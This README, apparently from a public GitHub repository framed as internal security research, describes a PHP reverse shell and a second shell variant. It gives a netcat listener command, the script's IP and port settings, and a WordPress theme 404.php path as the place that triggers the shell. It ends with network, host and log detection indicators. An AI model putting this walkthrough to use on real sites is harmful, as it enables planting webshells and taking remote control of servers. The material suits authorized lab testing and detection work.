# Shell Utilities – Internal Security Research Repository

## Overview

This repository contains **internal security research utilities** maintained for
authorized testing, simulation, and defensive validation by the security team.

The tools in this directory are used to:
- Validate web server hardening
- Simulate post-exploitation scenarios in labs
- Test SOC detections and alerting
- Support DFIR investigations and response drills

> ⚠️ **INTERNAL USE ONLY**
>
> All content in this repository is intended strictly for:
> - Internal lab environments
> - Systems owned by the organization
> - Scenarios with explicit written authorization  
>
> Unauthorized use is strictly prohibited.

---

## Repository Structure

| File | Description |
|----|------------|
| `php-reverse-shell.php` | PHP reverse shell used for controlled lab simulations |
| `php-mannager-shell.php` | Variant maintained for internal testing and experimentation |
| `iso.html` | Test HTML file for web behavior and response validation |

---

## php-reverse-shell.php

### Purpose

`php-reverse-shell.php` demonstrates how a PHP execution context can:

- Initiate an outbound TCP connection
- Spawn a system shell
- Redirect standard input/output over a network socket

This behavior is studied to:
- Validate detection logic
- Reproduce real incident conditions
- Train SOC and DFIR personnel
- Test network and host-based controls

---

## Technical Characteristics

| Attribute | Value |
|--------|------|
| Language | PHP |
| Execution Context | PHP interpreter (web / CLI) |
| Connection Model | Reverse TCP |
| Shell | `/bin/sh -i` |
| I/O Mode | Non-blocking streams |
| Target OS | Linux / Unix-like |

---

## High-Level Execution Flow

1. Script is interpreted by the PHP runtime
2. Outbound TCP connection is initiated to a configured listener
3. A shell process is spawned
4. STDIN / STDOUT / STDERR are redirected
5. Bidirectional command execution continues until termination

This execution model is common in real-world incidents and is therefore useful
for **defensive research and response validation**.

---

## Example: Authorized Lab Execution Flow

> **NOTE**
>
> This example demonstrates the execution flow in a **controlled internal lab**.
> All values below are **example placeholders** and must be replaced with
> environment-specific values approved by the security team.

---

### Example Listener Configuration (Test System)

A listener is started on a controlled internal host to receive the outbound
connection initiated by the PHP script.

```bash
nc -nvlp <LISTEN_PORT>
````

**Example (lab only):**

```bash
nc -nvlp 5555
```

---

### Example Script Configuration

In the PHP script, configure the listener details:

```php
$ip   = '<LISTENER_IP>';
$port = <LISTEN_PORT>;
```

**Example (lab only):**

```php
$ip   = '127.0.0.1';
$port = 5555;
```

---

### Example Execution Trigger (PHP Context)

The script is executed when accessed through an **authorized PHP execution
endpoint** within the test environment.

**Example execution context:**

```
/wp-content/themes/<TEST_THEME>/404.php
```

> The exact execution path depends on the lab setup and PHP execution permissions.

---

### Expected Result

Once the PHP script is executed:

* The target host initiates an outbound TCP connection to the listener
* An interactive shell is spawned under the web server execution context
* Commands issued from the listener are executed on the target system
* Output is returned over the same connection

This behavior is used to:

* Validate SOC detection
* Observe process creation
* Analyze outbound traffic patterns
* Test response playbooks

---

### Termination & Cleanup

* Close the listener session
* Remove test artifacts from the server
* Restore the environment to baseline
* Document findings

---

### Compliance Reminder

This example must **only** be used in:

* Internal labs
* Isolated virtual machines
* Approved red/blue team exercises

Production or unauthorized environments are strictly prohibited.

---

## Defensive & Detection Notes

This tool is commonly used to validate detection capabilities such as:

### Network Indicators

* Outbound TCP connections from web servers
* Long-lived sessions to non-standard ports

### Host Indicators

* PHP spawning shell processes
* Web server user executing `/bin/sh`
* Abnormal parent-child process relationships

### Log Indicators

* Web access logs triggering PHP execution
* Firewall logs showing outbound sessions
* System audit logs indicating command execution

---

## Risk Awareness

This repository contains tooling that:

* Mimics real attacker behavior
* Can trigger security alerts
* Must be handled carefully

All usage must be planned, approved, logged, and reviewed.

---

## Intended Audience

* SOC Analysts
* DFIR Engineers
* Red / Blue Team Members
* Security Researchers (internal)
* Detection Engineers

---

## Author / Maintainer

**Kiran Kumar K**
Internal Security Research
SOC | DFIR | VAPT

GitHub: [https://github.com/KIRAN-KUMAR-K3](https://github.com/KIRAN-KUMAR-K3)



